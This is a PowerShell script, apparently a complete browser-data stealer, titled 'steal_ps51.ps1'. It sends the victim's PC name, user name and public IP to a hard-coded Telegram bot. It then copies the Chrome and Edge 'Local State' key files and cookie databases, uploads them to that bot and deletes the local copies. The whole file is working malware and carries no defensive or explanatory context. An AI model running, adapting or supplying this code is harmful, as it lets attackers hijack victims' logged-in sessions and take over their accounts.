# steal_ps51.ps1
# Compatible with Windows PowerShell 5.1 – uses -InFile instead of -Form

$t = "8940444810:AAHeKIwsLgAI2o7H20984vi_1K-yEI2J3k8"
$c = "6760965981"
$base_url = "https://api.telegram.org/bot$t"

# --- PC INFO ---
$h = $env:COMPUTERNAME
$us = $env:USERNAME
$ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue)
$body = @{ chat_id = $c; text = "PC: $h | User: $us | IP: $ip" }
Invoke-RestMethod -Uri "$base_url/sendMessage" -Method Post -Body $body

# --- BROWSER PATHS ---
$paths = @(
    @{ Name = "Chrome"; LocalState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"; Cookies = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" },
    @{ Name = "Edge"; LocalState = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"; Cookies = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies" }
)

$temp_dir = "$env:TEMP\steal_tg"
New-Item -ItemType Directory -Force -Path $temp_dir | Out-Null
$sent = 0

foreach ($b in $paths) {
    # Local State
    if (Test-Path $b.LocalState) {
        $dst = "$temp_dir\$($b.Name)_LocalState.json"
        try { Copy-Item $b.LocalState $dst -Force -ErrorAction Stop } catch { continue }
        # Use -InFile for PowerShell 5.1
        $uri = "$base_url/sendDocument?chat_id=$c"
        try {
            Invoke-RestMethod -Uri $uri -Method Post -InFile $dst -ContentType "application/json" -ErrorAction Stop
            $sent++
        } catch {}
        Remove-Item $dst -Force -ErrorAction SilentlyContinue
    }
    # Cookies
    if (Test-Path $b.Cookies) {
        $dst = "$temp_dir\$($b.Name)_Cookies.db"
        try { Copy-Item $b.Cookies $dst -Force -ErrorAction Stop } catch { continue }
        $uri = "$base_url/sendDocument?chat_id=$c"
        try {
            Invoke-RestMethod -Uri $uri -Method Post -InFile $dst -ContentType "application/octet-stream" -ErrorAction Stop
            $sent++
        } catch {}
        Remove-Item $dst -Force -ErrorAction SilentlyContinue
    }
}

# --- STATUS ---
$status = "Sent $sent file(s). Temp folder: $temp_dir"
$body = @{ chat_id = $c; text = $status }
Invoke-RestMethod -Uri "$base_url/sendMessage" -Method Post -Body $body
